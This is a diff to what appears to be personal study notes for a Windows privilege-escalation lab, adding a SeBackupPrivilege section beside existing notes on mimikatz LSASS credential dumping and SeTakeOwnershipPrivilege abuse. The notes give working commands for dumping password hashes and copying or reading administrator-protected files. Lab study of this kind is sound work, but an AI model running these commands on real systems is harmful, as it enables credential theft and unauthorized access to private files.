@@ -349,8 +349,8 @@ mimikatz # log
 mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonpasswords  (You can see NTLM hash)
 _________________________________________________________________________________________________________________________________________________________________________________________
-SeTakeOwnershipPrivilege privilege escalation
----------------------------------------------
+SeTakeOwnershipPrivilege 
+-------------------------
 Enable-Privilege.ps1 (this script enables all the service)
 
 >Import-Module .\Enable-Privilege.ps1
@@ -374,3 +374,22 @@ Cannot read the file because of the ACL
 
 5.Finally read the file
 >cat C:\Department Shares\Private\IT\cred.txt
+_________________________________________________________________________________________________________________________________________________________________________________________
+SeBackupPrivilege 
+------------------
+> Import-Module .\SeBackupPrivilegeUtils.dll
+> Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+Enable SebackupPrivilege
+
+> Set-SeBackupPrivilege
+> Get-SeBackupPrivilege
+
+Copy private file from administrator location to user(htb-student) folder location
+
+>Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+
+Read the contract.txt file
+_________________________________________________________________________________________________________________________________________________________________________________________
+
+
